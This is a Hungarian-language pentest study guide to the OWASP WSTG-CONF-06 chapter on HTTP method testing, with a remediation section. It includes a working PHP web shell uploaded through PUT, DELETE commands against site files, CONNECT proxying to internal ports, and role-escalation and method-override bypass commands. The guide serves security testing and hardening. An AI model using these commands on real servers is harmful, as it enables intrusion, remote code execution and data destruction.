# WSTG-CONF-06: HTTP Methodok Tesztelése

## Mi a fejezet lényege?

Ez a fejezet arról szól, hogy a **webszerverek különböző HTTP methodokat** (GET, POST, PUT, DELETE, TRACE, CONNECT, stb.) támogatnak, és **rossz konfiguráció** esetén ezek **exploitation-t** tehetnek lehetővé (file upload, file delete, authentication bypass, proxy abuse).

⚠️ **NE KEVERD ÖSSZE:** Ez NEM általános HTTP testing, hanem specifikusan **HTTP method configuration** - mely methodok enabled, és hogyan lehet kihasználni őket (PUT → file upload, DELETE → file törlés, TRACE → XST).

---

## Mi a cél?

**HTTP methodok enumerálása és tesztelése:**

- Mely methodok támogatottak
- Access control bypass lehetőségek
- HTTP method overriding technikák
- Dangerous methods exploitation (PUT, DELETE, TRACE, CONNECT)

---

## HTTP Methods Overview

### Standard HTTP Methods (RFC 7231):

| Method    | Eredeti Cél    | RESTful Cél       | Veszély         |
| --------- | -------------- | ----------------- | --------------- |
| `GET`     | Fájl lekérés   | Object lekérés    | Minimal         |
| `HEAD`    | Headers only   | -                 | Minimal         |
| `POST`    | Data submit    | -                 | Minimal         |
| `PUT`     | File upload    | Object létrehozás | **HIGH**        |
| `DELETE`  | File törlés    | Object törlés     | **CRITICAL**    |
| `CONNECT` | TCP connection | -                 | **HIGH**        |
| `OPTIONS` | List methods   | CORS preflight    | Info disclosure |
| `TRACE`   | Echo request   | -                 | XST (elavult)   |
| `PATCH`   | -              | Object módosítás  | **MEDIUM**      |

---

## Tesztelési Technikák

### 1. **Method Discovery** (OPTIONS)

### 2. **PUT Method** (File Upload)

### 3. **DELETE Method** (File Törlés)

### 4. **TRACE Method** (Cross-Site Tracing)

### 5. **CONNECT Method** (Proxy Abuse)

### 6. **PATCH Method** (Object Modification)

### 7. **Access Control Bypass**

### 8. **HTTP Method Overriding**

---

## 1. Method Discovery

### Tool #1: **OPTIONS Request**

#### curl parancs:

```bash
# Basic OPTIONS request
curl -X OPTIONS https://pelda.hu -i

# Specific path
curl -X OPTIONS https://pelda.hu/admin/ -i

# Verbose
curl -X OPTIONS https://pelda.hu -v
```

**Response példa:**

```http
HTTP/1.1 200 OK
Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE
```

**Mit látsz:**

- `PUT, DELETE` enabled → **VESZÉLYES!**
- `TRACE` enabled → XST vulnerability
- `CONNECT` enabled → Proxy abuse

---

### Tool #2: **Nmap - http-methods Script**

#### Parancs:

```bash
# HTTP methods enumeration
nmap --script http-methods pelda.hu

# Specific path
nmap --script http-methods --script-args http-methods.url-path='/admin/' pelda.hu

# Test risky methods
nmap --script http-methods --script-args http-methods.test-all pelda.hu
```

**Output példa:**

```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
```

---

### Manual Method Testing:

```bash
# Test each method
curl -X GET https://pelda.hu -i
curl -X POST https://pelda.hu -i
curl -X PUT https://pelda.hu -i
curl -X DELETE https://pelda.hu -i
curl -X TRACE https://pelda.hu -i
curl -X CONNECT https://pelda.hu -i
curl -X PATCH https://pelda.hu -i
```

**Expected responses:**

- `200 OK` → Method supported
- `405 Method Not Allowed` → Method disabled
- `501 Not Implemented` → Method not recognized

---

### Arbitrary Methods (WAF Bypass):

```bash
# Custom method
curl -X FOO https://pelda.hu

# Vagy
curl -X ARBITRARY https://pelda.hu
```

**Ha 200 OK:**

- Szerver treats as GET
- WAF bypass lehetséges

---

## 2. PUT Method - File Upload

### Concept:

**Legacy webszerverek** engedélyezik fájl upload-ot PUT method-dal.

### Attack Scenario:

#### Teszt HTML file:

```bash
# Create test file
echo "<h1>Test</h1>" > test.html

# Upload with PUT
curl -X PUT https://pelda.hu/test.html -d "<h1>Test</h1>"

# Vagy
curl https://pelda.hu/test.html --upload-file test.html
```

**Ellenőrzés:**

```bash
curl https://pelda.hu/test.html
```

**Ha sikeres:**

```html
<h1>Test</h1>
```

---

#### PHP Backdoor Upload:

```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload
curl -X PUT https://pelda.hu/shell.php --upload-file shell.php

# Execute
curl "https://pelda.hu/shell.php?cmd=whoami"
```

**Ha sikeres:**

```
www-data
```

→ **Remote Code Execution!**

---

#### WebDAV PUT:

```bash
# WebDAV PUT
curl -X PUT https://pelda.hu/uploads/backdoor.php \
  -H "Content-Type: application/x-php" \
  -d '<?php system($_GET["cmd"]); ?>'

# Verify
curl "https://pelda.hu/uploads/backdoor.php?cmd=id"
```

---

### RESTful API PUT (Modern):

```bash
# Create object
curl -X PUT https://pelda.hu/api/users/foo \
  -H "Content-Type: application/json" \
  -d '{"role": "user", "email": "foo@test.com"}'

# Privilege escalation attempt
curl -X PUT https://pelda.hu/api/users/foo \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**Ha nincs proper authorization:**
→ User role changed to admin!

---

## 3. DELETE Method - File Törlés

### Concept:

**DELETE method** fájlokat törölhet a szerverről.

### ⚠️ **FIGYELEM: DESTRUCTIVE ACTION!**

```bash
# Test file upload first
curl -X PUT https://pelda.hu/testfile.txt -d "test"

# Delete file
curl -X DELETE https://pelda.hu/testfile.txt

# Verify deletion
curl https://pelda.hu/testfile.txt
# → 404 Not Found
```

---

### RESTful API DELETE:

```bash
# Delete user object
curl -X DELETE https://pelda.hu/api/users/foo

# IDOR + DELETE
curl -X DELETE https://pelda.hu/api/users/1  # Admin user
curl -X DELETE https://pelda.hu/api/users/2  # Victim user
```

**Ha nincs authorization check:**
→ Bármely user törölhető!

---

### Critical Files Delete (Ha enabled):

```bash
# ⚠️ NE TESZTELD PRODUCTION-BAN!
curl -X DELETE https://pelda.hu/index.html
curl -X DELETE https://pelda.hu/config.php
```

---

## 4. TRACE Method - Cross-Site Tracing (XST)

### Concept:

**TRACE method** visszaküldi a request-et → **XST attack** (elavult).

### Tesztelés:

```bash
# TRACE request
curl -X TRACE https://pelda.hu -i

# With custom header
curl -X TRACE https://pelda.hu -H "X-Test: Secret" -i
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: pelda.hu
X-Test: Secret
```

**Veszély (régen):**

- Echo-olta a Cookie-kat
- HttpOnly bypass XST-vel
- **Most már nem exploitable** (browsers block TRACE)

---

### Microsoft TRACK (IIS):

```bash
# TRACK method (Microsoft equivalent)
curl -X TRACK https://pelda.hu -i
```

---

## 5. CONNECT Method - Proxy Abuse

### Concept:

**CONNECT method** TCP connection-t nyit → **proxy abuse**.

### Tesztelés:

```bash
# Connect to internal IP
curl -X CONNECT https://pelda.hu \
  -H "Host: 192.168.1.100:22" -i

# Connect to localhost
curl -X CONNECT https://pelda.hu \
  -H "Host: 127.0.0.1:3306" -i
```

**Ha enabled:**

- Proxy traffic through server
- Access internal network
- Port scanning via proxy
- Hide attacker IP

---

### SSRF via CONNECT:

```bash
# Access localhost MySQL
curl -X CONNECT pelda.hu:80 \
  -H "Host: 127.0.0.1:3306"

# Access internal admin panel
curl -X CONNECT pelda.hu:80 \
  -H "Host: 10.0.0.5:80"
```

---

## 6. PATCH Method - Object Modification

### Concept:

**PATCH method** object részleges módosítása (RESTful API).

### JSON PATCH (RFC 6902):

```bash
# Proper PATCH (JSON PATCH)
curl -X PATCH https://pelda.hu/api/users/foo \
  -H "Content-Type: application/json-patch+json" \
  -d '{"op": "replace", "path": "/role", "value": "admin"}'
```

---

### Simplified PATCH (Common):

```bash
# Simplified PATCH
curl -X PATCH https://pelda.hu/api/users/foo \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**Veszély:**

- Weak authorization → privilege escalation
- Less input validation → XSS, injection
- Business logic bypass

---

### PATCH vs PUT:

**PUT:**

- Entire object overwrite
- Missing fields → deleted

```bash
# PUT
curl -X PUT https://pelda.hu/api/users/foo \
  -d '{"role": "admin"}'

# Result: {"role": "admin"} (email missing!)
```

**PATCH:**

- Partial update
- Only specified fields changed

```bash
# PATCH
curl -X PATCH https://pelda.hu/api/users/foo \
  -d '{"role": "admin"}'

# Result: {"role": "admin", "email": "foo@test.com"}
```

---

## 7. Access Control Bypass

### Concept:

**Different HTTP methods** különböző authorization check-eket kaphatnak.

### Scenario:

**GET request:**

```bash
curl https://pelda.hu/admin/ -i
```

**Response:**

```http
HTTP/1.1 302 Found
Location: /login
```

---

**HEAD request:**

```bash
curl -X HEAD https://pelda.hu/admin/ -i
```

**Response:**

```http
HTTP/1.1 200 OK
Set-Cookie: adminSessionCookie=abc123; Path=/
```

→ **Authentication bypass!**

---

### Different Method Bypass:

```bash
# GET → 302 redirect
curl https://pelda.hu/admin/ -i

# POST → 200 OK
curl -X POST https://pelda.hu/admin/ -i

# FOO → 200 OK
curl -X FOO https://pelda.hu/admin/ -i
```

---

### Action via HEAD/FOO:

```bash
# Create user via HEAD
curl -X HEAD "https://pelda.hu/admin/createUser.php?username=hacker&password=pass&role=admin"

# Or via arbitrary method
curl -X FOO https://pelda.hu/admin/createUser.php \
  -d "username=hacker&password=pass&role=admin"
```

---

## 8. HTTP Method Overriding

### Concept:

**Framework-ök** lehetővé teszik HTTP method override custom header-ekkel.

### Override Headers:

- `X-HTTP-Method`
- `X-HTTP-Method-Override`
- `X-Method-Override`

---

### Attack Scenario:

**Original request (blocked):**

```bash
curl -X DELETE https://pelda.hu/resource.html -i
```

**Response:**

```http
HTTP/1.1 405 Method Not Allowed
```

---

**With override header:**

```bash
curl -X GET https://pelda.hu/resource.html \
  -H "X-HTTP-Method: DELETE" -i
```

**Response:**

```http
HTTP/1.1 200 OK
```

→ **WAF/middleware bypass!**

---

### All Override Headers:

```bash
# X-HTTP-Method
curl -X GET https://pelda.hu/api/users/1 \
  -H "X-HTTP-Method: DELETE"

# X-HTTP-Method-Override
curl -X GET https://pelda.hu/api/users/1 \
  -H "X-HTTP-Method-Override: DELETE"

# X-Method-Override
curl -X GET https://pelda.hu/api/users/1 \
  -H "X-Method-Override: DELETE"
```

---

### Burp Suite Intruder - Override Testing:

```
1. Intercept request
2. Send to Intruder
3. Add position: X-HTTP-Method: §DELETE§
4. Payloads: DELETE, PUT, PATCH
5. Start attack
```

---

## Comprehensive Testing Workflow

### 1. Method Discovery:

```bash
# OPTIONS
curl -X OPTIONS https://pelda.hu -i

# Nmap
nmap --script http-methods pelda.hu
```

---

### 2. PUT Testing:

```bash
# Test file upload
echo "test" > test.txt
curl -X PUT https://pelda.hu/test.txt --upload-file test.txt

# Verify
curl https://pelda.hu/test.txt
```

---

### 3. DELETE Testing:

```bash
# Delete test file
curl -X DELETE https://pelda.hu/test.txt

# Verify
curl https://pelda.hu/test.txt
# → 404 if deleted
```

---

### 4. TRACE Testing:

```bash
curl -X TRACE https://pelda.hu -i
```

---

### 5. Access Control Bypass:

```bash
# Protected page
curl https://pelda.hu/admin/ -i
# → 302 redirect?

# Try HEAD
curl -X HEAD https://pelda.hu/admin/ -i
# → 200 OK?
```

---

### 6. Method Override:

```bash
# Blocked DELETE
curl -X DELETE https://pelda.hu/resource -i
# → 405?

# Override
curl -X GET https://pelda.hu/resource \
  -H "X-HTTP-Method: DELETE" -i
# → 200?
```

---

## Gyakorlati Cheat Sheet

| Method          | Parancs                                         | Veszély              |
| --------------- | ----------------------------------------------- | -------------------- |
| OPTIONS         | `curl -X OPTIONS URL -i`                        | Info disclosure      |
| PUT             | `curl -X PUT URL --upload-file file.txt`        | File upload → RCE    |
| DELETE          | `curl -X DELETE URL/file.txt`                   | File deletion        |
| TRACE           | `curl -X TRACE URL -i`                          | XST (elavult)        |
| CONNECT         | `curl -X CONNECT URL -H "Host: 127.0.0.1:3306"` | Proxy abuse          |
| PATCH           | `curl -X PATCH URL -d '{"role":"admin"}'`       | Privilege escalation |
| HEAD bypass     | `curl -X HEAD URL/admin/ -i`                    | Auth bypass          |
| Method override | `curl -X GET URL -H "X-HTTP-Method: DELETE"`    | WAF bypass           |

---

## Fontos Toolok

### Manual Testing:

- **curl** - HTTP request tool
- **netcat (nc)** - Raw TCP
- **Burp Suite** - Proxy + Intruder

### Automated:

- **Nmap** - http-methods script
- **Nikto** - Web scanner
- **ZAP** - OWASP proxy

---

## Védelem (Remediation)

### 1. Disable Dangerous Methods:

**Apache:**

```apache
<Directory /var/www/html>
    <LimitExcept GET POST HEAD>
        Require all denied
    </LimitExcept>
</Directory>
```

---

**nginx:**

```nginx
location / {
    limit_except GET POST HEAD {
        deny all;
    }
}
```

---

**IIS:**

```xml
<system.webServer>
  <security>
    <requestFiltering>
      <verbs>
        <add verb="PUT" allowed="false" />
        <add verb="DELETE" allowed="false" />
        <add verb="TRACE" allowed="false" />
        <add verb="CONNECT" allowed="false" />
      </verbs>
    </requestFiltering>
  </security>
</system.webServer>
```

---

---

### 3. Disable Method Override:

**Express.js:**

```javascript
// Don't use method-override middleware
// app.use(methodOverride('X-HTTP-Method-Override'));
```

---

### 4. RESTful API Authorization:

```
Every method needs authorization:
- GET → Read permission
- POST → Create permission
- PUT/PATCH → Update permission
- DELETE → Delete permission
```

---

## Fontos Megjegyzések

✅ **OPTIONS** → info disclosure (mely methodok enabled)  
✅ **PUT** → file upload → potenciálisan RCE  
✅ **DELETE** → destructive! File törlés  
✅ **TRACE** → XST (már nem exploitable modern browsers-ben)  
✅ **CONNECT** → proxy abuse, SSRF  
✅ **PATCH** → partial update, less validation?  
❌ **RESTful API-kon PUT/DELETE normális** (nem vulnerability önmagában!)  
⚠️ **Method override** → WAF/middleware bypass  
⚠️ **HEAD/FOO** method → auth bypass lehetséges!

---

**Összefoglalva:** Ez a fejezet a **HTTP methodok teszteléséről** szól. **OPTIONS request** felsorolja a supported method-okat. **PUT method** file upload-ot engedélyezhet (legacy servers) → **RCE**. **DELETE method** file törlést tesz lehetővé → **destructive**! **TRACE** visszaecho-lja a request-et → **XST** (elavult). **CONNECT** proxy-ként működik → **SSRF**. **Method override header-ek** (`X-HTTP-Method: DELETE`) **WAF bypass-t** tehetnek lehetővé. **Authorization check-et** minden method-ra külön kell végezni, különben **auth bypass** lehetséges (**HEAD** vagy arbitrary method-okkal)!
